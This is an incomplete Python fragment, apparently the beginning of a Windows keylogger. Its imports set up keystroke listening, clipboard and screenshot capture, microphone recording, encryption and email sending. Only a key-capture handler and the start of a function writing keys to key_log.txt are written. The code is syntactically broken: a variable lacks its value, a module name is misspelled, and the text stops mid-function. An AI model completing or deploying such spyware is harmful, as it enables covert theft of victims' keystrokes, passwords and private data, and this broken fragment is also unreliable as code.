# Libraries 

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import soundddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"

file_path = 
extend= "\\"

count = 0 
keys =[]

def on_press(key):
    global keys,  count 

    print(key)
    keys.append(key)
    count +=1

def write_file(keys):
    with open(file_path + extend+keys_information, "a")as f:
        
